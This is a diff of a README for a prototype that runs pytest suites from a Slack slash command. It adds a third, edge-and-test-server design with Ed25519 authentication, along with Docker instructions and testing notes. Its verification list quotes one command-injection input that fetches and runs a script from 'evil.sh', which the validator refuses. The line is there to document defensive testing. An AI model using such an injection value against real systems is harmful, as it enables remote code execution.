@@ -5,26 +5,53 @@ A working prototype of the **"Testing via Slack"** design from
 the team run a pytest suite and read the outcome, without a GitHub account, a
 VPN, or any knowledge of pytest's command line.
 
-It ships in two versions, and the difference between them is the whole point.
+It ships in three versions, and the differences between them are the whole point.
 
-| | What the API does | Where tests run |
-|---|---|---|
-| **V1** `RUNTESTS_MODE=local` | validates, then runs pytest itself | **the API host** |
-| **V2** `RUNTESTS_MODE=github` | validates, then dispatches a workflow | **a self-hosted runner** that polls GitHub |
+| | What the public process does | Where tests run | Who queues | Who posts to Slack |
+|---|---|---|---|---|
+| **V1** `RUNTESTS_MODE=local` | validates, then runs pytest itself | **the API host** | nobody | the API |
+| **V2** `RUNTESTS_MODE=github` | validates, then dispatches a workflow | a self-hosted runner polling **GitHub** | GitHub | the runner |
+| **V3** edge + test servers | validates and queues; runs nothing | **your own test servers**, polling the edge | the edge (SQLite) | the test servers |
 
-**V2 is the one you would deploy.** In V1 the process answering the internet is
-the process running the tests. V2 breaks that link: the public API never runs a
-test — it authenticates, authorises, validates, dispatches, and answers — and
-the machine inside your network only ever calls *out*, so it needs no inbound
-connectivity and no open port. You also inherit logs, artifacts, retention,
-concurrency limits and an approval gate without writing any of them.
+**V3 is the one to deploy, and it lives in [`edge/`](edge/) and
+[`test-server/`](test-server/), each with its own README.**
+
+The through-line across all three is one rule: *the process answering the
+internet must not be the process running the tests.* V1 breaks it and is useful
+anyway for one host. V2 fixes it by renting GitHub's queue and runners. V3 fixes
+it while owning both — which costs a queue you have to write, and buys three
+things renting could not:
+
+- **No Slack token on any public host.** The edge answers Slack's HTTP request
+  and never calls the Slack API. Every message in the channel is posted by the
+  test server that ran the code, so it cannot claim something that did not
+  happen.
+- **No GitHub in the trust path**, and no `SLACK_BOT_TOKEN` distributed to every
+  runner the way `runtests.yml` has to.
+- **Mutual authentication.** Each test server holds an Ed25519 private key; the
+  edge holds only public keys and signs its replies in return. Revoking a
+  machine is deleting one file.
+
+In every version the machines inside your network only ever call *out*, so they
+need no inbound connectivity and no open port.
 
 ## Try it
 
 ```bash
-bash run.sh                    # terminal 1 — syncs, then starts on :8500
+bash run.sh                    # terminal 1 — V1/V2 API on :8500
 bash test.sh                   # terminal 2 — POSTs a signed slash command
 ```
+
+Or the deployable arrangement — an edge and three test servers, in containers:
+
+```bash
+docker compose -f docker/compose.yml up --build     # or: bash run.sh docker
+bash test.sh                                        # in another terminal
+docker compose -f docker/compose.yml logs -f runner-1
+```
+
+Only the edge publishes a port. The three test servers publish nothing, which
+is the security property expressed as configuration.
 
 **Use `run.sh` rather than a bare `uv run` on the Mac.** This workspace is a
 Samba share, so both machines see the same `.venv` — and it is a Linux one. A
@@ -108,9 +135,23 @@ slack-runtests/
 │   └── runners/
 │       ├── local.py                 # V1 — subprocess pytest here
 │       └── github.py                # V2 — workflow_dispatch
+├── edge/                            # V3 — the public deployable  (README inside)
+│   └── edge_server/
+│       ├── app.py                   # both doors: /slack/commands and /runner/*
+│       ├── store.py                 # the queue: SQLite, atomic claim, leases
+│       ├── auth.py                  # who may enrol, and how
+│       └── config.py
+├── test-server/                     # V3 — the internal deployable (README inside)
+│   └── test_server/
+│       ├── agent.py                 # enrol → heartbeat → claim → run → report
+│       ├── client.py                # the only place a connection is opened
+│       ├── reporter.py              # the four Slack milestones
+│       └── config.py
+├── docker/                          # 1 edge + 3 identical test servers
 ├── .github/workflows/runtests.yml   # the action V2 dispatches
 └── tests/
-    ├── unit/                        # this project's own gate (60 tests)
+    ├── unit/                        # this project's gate (136 tests)
+    ├── integration/                 # 3 tests against a REAL server process
     └── sample/webapp/               # the demo suite the Slack command runs
 ```
 
@@ -173,7 +214,8 @@ Stated plainly rather than left to be discovered:
 ## Verified
 
 ```bash
-bash run.sh test -q       # 60 passed
+bash run.sh test -q                # 136 passed  (unit)
+bash run.sh test:integration -q    #   3 passed  (integration, real server)
 ```
 
 Checked, not assumed:
@@ -184,16 +226,38 @@ Checked, not assumed:
 - `-p ../../etc`, `-s prod`, and `-k 'smoke"; curl evil.sh | sh; "'` all refused.
 - A retried `trigger_id` returns "already queued" and starts no second run.
 - V2 with no credentials logs the dispatch it *would* have made.
-- **Non-vacuity:** three vulnerabilities were planted — always-true signature,
-  removed replay window, unrestricted product — and each was caught by the
-  suite; green again after restore.
+- **Non-vacuity, V1/V2:** three vulnerabilities were planted — always-true
+  signature, removed replay window, unrestricted product — and each was caught
+  by the suite; green again after restore.
+- **Non-vacuity, integration tier:** three more were planted, one per test —
+  always-true signature (caught by the invalid-origin test), `../../etc` and
+  `prod` added to the allowlists (caught by the invalid-structure test), and a
+  gate that never accepts (caught by the accepted test). Each failed exactly
+  the intended test and nothing else; all three green again after restore.
+- **The V3 harness, end to end:** `docker compose up`, three test servers
+  enrolled with distinct Ed25519 keys and went online; five slash commands were
+  distributed across all three with no job run twice; all five reported
+  `done` with `3 passed · 0 failed · 1 skipped`; all four Slack milestones
+  appeared on each runner's console with the runner named.
+- **Offline detection:** with all three stopped, the fleet view showed
+  `offline` after 30s and a new command answered *"queued, but no test server is
+  online"*. Restarting them ran that queued job — so the message is true, not
+  just reassuring.
 
 ### Testing gap
 
-Unit tier plus the manual end-to-end above. **No E2E tier** — that would need a
-real Slack workspace and a real runner. The integration tier is partial: `api.py`
-is covered via `TestClient`, but `runners/local.py` is only covered at the argv
-level, not by spawning a real subprocess.
+**Unit and integration tiers exist; the E2E tier is partial and must be
+described as such.** The docker harness drives a real slash command through a
+real edge to three real test servers that really run pytest — but with no Slack
+workspace, so the last hop is a console print rather than a message in a
+channel. That is *E2E minus Slack*, and calling it end-to-end without the
+qualifier would be claiming a tier that does not exist. TLS and the public
+internet are likewise not covered.
+
+Also still missing: `runners/local.py` (V1) is covered only at the argv level,
+not by spawning a real subprocess; and the lease-expiry recovery path is proven
+by unit tests with a controlled clock rather than by killing a container
+mid-run.
 
 ## License
 
